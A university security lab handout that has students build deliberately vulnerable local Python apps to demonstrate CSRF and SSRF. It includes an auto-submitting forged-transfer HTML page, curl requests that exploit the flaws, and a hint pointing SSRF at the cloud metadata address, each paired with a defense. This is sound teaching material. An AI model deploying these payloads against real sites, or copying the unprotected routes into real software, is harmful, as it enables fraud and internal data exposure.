# Lab 11: Request Forgeries, CSRF and SSRF

## Objectives

By the end of this lab, you will be able to:

1. Execute a cross-site request forgery against a banking application that trusts the session cookie alone.
2. Defeat the same attack with a synchronizer token, and explain why the forged request fails.
3. Use a server-side request forgery to read an internal service through a public fetcher, and block the attack with a destination allow-list.

## Prerequisites

- SSH access to your assigned course VM (Linux). No administrator rights are required.
- Python 3 with the standard library only.
- Chapter 8 notes, Section 2: request forgeries, CSRF conditions and defenses, and SSRF.

## Before you start

### Background

A forged request tricks a web application into performing an unintended action. CSRF exploits the application's trust in an authenticated user: the browser attaches cookies to every request automatically, so a hidden form on a malicious page can send a valid request without the user's knowledge. SSRF exploits the server's network position: the server can reach internal services that the attacker cannot reach directly.

| Concept from the lecture | Where you observe the concept in this lab |
| --- | --- |
| CSRF trusts the ambient cookie | Part 2: a forged POST succeeds with only the session cookie |
| Synchronizer token | Part 3: `/transfer2` rejects the forged request without the token |
| SSRF reaches internal resources | Part 4: `/fetch` reads the localhost-only service on port 8999 |
| SSRF through the loopback interface | Part 4: the internal service binds 127.0.0.1 only |
| Allow-list defense | Part 4: `/fetch2` refuses the internal destination |

### Set-up and Implementation

- On the VM, create a folder for this lab in the class folder in the home directory.
  - create folder: `mkdir -p ~/comp301/lab11`
  - go to folder: `cd ~/comp301/lab11`

## Part 1: A banking session

Write the bank application:

```bash
cat > bank.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 11 bank. /transfer trusts the session cookie alone (vulnerable to CSRF).
/transfer2 also requires a synchronizer token from /form."""
import secrets
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

SESSIONS = {}
TOKENS = {}
BALANCES = {"alice": 1000, "attacker": 0}

FORM = """<form method="POST" action="/transfer2">
<input type="hidden" name="csrf" value="{token}">
to: <input name="to"> amount: <input name="amount"> <button>Send</button>
</form>"""


class H(BaseHTTPRequestHandler):
    def _send(self, body, code=200, cookie=None):
        data = body.encode()
        self.send_response(code)
        if cookie:
            self.send_header("Set-Cookie", cookie)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _user(self):
        raw = self.headers.get("Cookie", "")
        for part in raw.split(";"):
            k, _, v = part.strip().partition("=")
            if k == "SID" and v in SESSIONS:
                return SESSIONS[v]
        return None

    def _move(self, user, data):
        to = data.get("to", [""])[0]
        amount = int(data.get("amount", ["0"])[0])
        if to in BALANCES and 0 < amount <= BALANCES[user]:
            BALANCES[user] -= amount
            BALANCES[to] += amount
            self._send(f"sent {amount} to {to}\n")
        else:
            self._send("transfer failed\n", 400)

    def do_GET(self):
        u = urlparse(self.path)
        q = parse_qs(u.query)
        if u.path == "/login":
            name = q.get("name", [""])[0]
            if name not in BALANCES:
                self._send("unknown user\n", 403)
                return
            sid = secrets.token_hex(8)
            SESSIONS[sid] = name
            self._send(f"logged in as {name}\n", cookie=f"SID={sid}; HttpOnly")
        elif u.path == "/form":
            user = self._user()
            if not user:
                self._send("login first\n", 403)
                return
            token = secrets.token_hex(8)
            TOKENS[user] = token
            self._send(FORM.format(token=token))
        elif u.path == "/balance":
            user = self._user()
            if not user:
                self._send("login first\n", 403)
                return
            self._send(f"balance {user}={BALANCES[user]}, attacker={BALANCES['attacker']}\n")
        else:
            self.send_error(404)

    def do_POST(self):
        u = urlparse(self.path)
        user = self._user()
        if not user:
            self._send("login first\n", 403)
            return
        n = int(self.headers.get("Content-Length", 0))
        data = parse_qs(self.rfile.read(n).decode())
        if u.path == "/transfer":
            self._move(user, data)
        elif u.path == "/transfer2":
            if data.get("csrf", [""])[0] != TOKENS.get(user):
                self._send("bad token\n", 403)
                return
            self._move(user, data)
        else:
            self.send_error(404)

    def log_message(self, *a):
        pass


print("Listening on http://127.0.0.1:8200")
HTTPServer(("127.0.0.1", 8200), H).serve_forever()
PYEOF
```

Start the bank and leave the server running:

```bash
python3 bank.py
```

Work from a second SSH session in `~/comp301/lab11`. Log in as alice and save the session cookie:

```bash
curl -s -c jar.txt 'http://127.0.0.1:8200/login?name=alice'
cat jar.txt
```

The jar holds the `SID` cookie. A browser stores the same kind of cookie and attaches the cookie to every request to the bank automatically.

## Part 2: The forged request

The attacker never learns the cookie value. The attacker only needs the victim's browser to send a request, and the browser attaches the cookie on behalf of the victim. Simulate the forged request with the saved cookie:

```bash
curl -s -b jar.txt -X POST -d 'to=attacker&amount=100' http://127.0.0.1:8200/transfer
curl -s -b jar.txt http://127.0.0.1:8200/balance
```

The bank moved 100 from alice to the attacker. No token, no prompt, no suspicion, because the cookie alone proved the session. On a machine with a browser, the file below performs the same attack the moment the page loads:

```bash
cat > evil.html << 'HTMLEOF'
<!doctype html>
<html><body onload="document.forms[0].submit()">
<h1>Free kittens, nothing suspicious</h1>
<form method="POST" action="http://127.0.0.1:8200/transfer">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="100">
</form>
</body></html>
HTMLEOF
```

The hidden form and the auto-submit match the hidden form and image tag vectors from the notes. Record the balance line for the Assignment.

## Part 3: The synchronizer token defense

Request the transfer form, which now carries a secret token:

```bash
curl -s -b jar.txt http://127.0.0.1:8200/form
```

Replay the same forged request against the token-protected route:

```bash
curl -s -b jar.txt -X POST -d 'to=attacker&amount=100' http://127.0.0.1:8200/transfer2
```

The bank answers `bad token`. The malicious page cannot read the token, because the token travels in the form rather than riding along automatically the way a cookie does. Now perform the transfer correctly:

```bash
TOK=$(curl -s -b jar.txt http://127.0.0.1:8200/form | grep -o 'value="[a-f0-9]*"' | cut -d'"' -f2)
curl -s -b jar.txt -X POST -d "to=attacker&amount=50&csrf=$TOK" http://127.0.0.1:8200/transfer2
curl -s -b jar.txt http://127.0.0.1:8200/balance
```

The legitimate transfer succeeds with the token. Record both balance values.

## Part 4: Server-side request forgery

Start two more applications in separate terminals. The internal service binds localhost only:

Open a third SSH session in `~/comp301/lab11`:

```bash
cat > internal.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 11 internal service. Binds localhost only, so only processes on this
machine can reach the service directly."""
from http.server import BaseHTTPRequestHandler, HTTPServer

BODY = b"INTERNAL-ONLY customer table: alice, bob, carol\n"


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(BODY)))
        self.end_headers()
        self.wfile.write(BODY)

    def log_message(self, *a):
        pass


HTTPServer(("127.0.0.1", 8999), H).serve_forever()
PYEOF

cat > fetcher.py << 'PYEOF'
#!/usr/bin/env python3
"""Lab 11 fetcher. /fetch retrieves any URL (vulnerable to SSRF).
/fetch2 allows only the destinations in ALLOWED."""
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen

ALLOWED = {"example.com", "neverssl.com"}


def grab(url):
    with urlopen(url, timeout=5) as r:
        return r.read(400).decode(errors="replace")


class H(BaseHTTPRequestHandler):
    def _send(self, body, code=200):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        u = urlparse(self.path)
        q = parse_qs(u.query)
        url = q.get("url", [""])[0]
        if u.path == "/fetch":
            try:
                self._send(grab(url))
            except Exception as e:
                self._send(f"error: {e}", 400)
        elif u.path == "/fetch2":
            host = urlparse(url).hostname or ""
            if host not in ALLOWED:
                self._send("destination not allowed\n", 403)
                return
            try:
                self._send(grab(url))
            except Exception as e:
                self._send(f"error: {e}", 400)
        else:
            self.send_error(404)

    def log_message(self, *a):
        pass


print("Listening on http://127.0.0.1:8201")
HTTPServer(("127.0.0.1", 8201), H).serve_forever()
PYEOF
```

Start the internal service in the third session and the fetcher in a fourth SSH session:

```bash
python3 internal.py   # third session
python3 fetcher.py    # fourth session
```

From a free terminal, ask the fetcher for a public page, then for the internal service:

```bash
curl -s --max-time 20 'http://127.0.0.1:8201/fetch?url=http://neverssl.com/' | head -3
curl -s 'http://127.0.0.1:8201/fetch?url=http://127.0.0.1:8999/'
```

The second answer contains the internal customer table. On a real deployment the fetcher faces the internet while port 8999 faces nothing, yet the fetcher reads the internal service on the attacker's behalf. This is the SSRF pattern: the server becomes the attacker's proxy, here through the loopback interface.

Apply the allow-list defense:

```bash
curl -s 'http://127.0.0.1:8201/fetch2?url=http://127.0.0.1:8999/'
curl -s --max-time 20 'http://127.0.0.1:8201/fetch2?url=http://neverssl.com/' | head -3
```

The internal destination is refused, and the allowed destination still works. If the public fetch times out on a restricted network, the internal demonstration still stands on its own, and you can substitute any reachable site in `ALLOWED`.

Stop all three servers with `Ctrl+C` when you finish.

## Part 5: Analysis

Answer in one sentence each, from what you observed:

1. Why does the attacker in Part 2 never need to read the victim's cookie?
2. Why does the malicious page fail against `/transfer2` even though the page can still force the browser to send the cookie?
3. In Part 4, what network property of the fetcher makes the internal service reachable through the fetcher?

## Assignment

Create a `submission.txt` file with the following entries:

- `forged-balance: <the balance line after the forged transfer in Part 2>`
- `tokenless-transfer2: <the response body from the tokenless request in Part 3>`
- `token-balance: <the balance line after the token transfer in Part 3>`
- `ssrf-internal-line: <the first line returned through /fetch from port 8999>`
- `fetch2-internal: <the response body from /fetch2 with the internal URL>`
- `analysis-1: <one sentence>`
- `analysis-2: <one sentence>`
- `analysis-3: <one sentence>`

## Submission

- Place `submission.txt` in this lab folder (`~/comp301/lab11`) and name the file exactly `submission.txt`.

## Useful References and Resources

- OWASP, "Cross-Site Request Forgery Prevention Cheat Sheet": synchronizer tokens and double-submit cookies.
- OWASP, "Server Side Request Forgery Prevention Cheat Sheet": destination validation and allow-lists.
- CWE-352, "Cross-Site Request Forgery (CSRF)," and CWE-918, "Server-Side Request Forgery (SSRF)."
- Chapter 8 notes, Section 2: the CSRF conditions and the SSRF loopback example.

## Optional Challenges

- Convert the token defense to the double-submit cookie pattern from the notes: send the token in a cookie and compare the cookie value with the form value on the server.
- Extend the allow-list check to resolve the hostname and reject private address ranges such as 10.0.0.0/8 and 169.254.0.0/16, then test `/fetch2` against `http://169.254.169.254/` and explain what cloud service that address belongs to.
